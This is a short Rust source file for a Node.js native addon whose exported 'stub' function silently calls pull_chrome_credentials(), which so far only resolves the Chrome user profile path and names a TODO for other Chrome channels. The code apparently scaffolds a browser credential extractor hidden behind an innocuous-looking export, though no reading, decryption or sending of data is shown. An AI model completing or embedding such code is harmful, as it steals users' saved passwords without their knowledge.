use neon::prelude::*;

use rusqlite::{Connection, Result};

use crate::utils::format_home_path;
use crate::error::ExtractorResult;

pub fn stub(mut cx: FunctionContext) -> JsResult<JsUndefined> {
    pull_chrome_credentials().ok();

    Ok(cx.undefined())
}

pub fn pull_chrome_credentials() -> ExtractorResult<()> {
    // TODO: Check for Canary, Beta, Dev, etc.
    let chrome_data_path = format_home_path(&"AppData/Local/Google/Chrome/User Data/Default")?;


    Ok(())
}
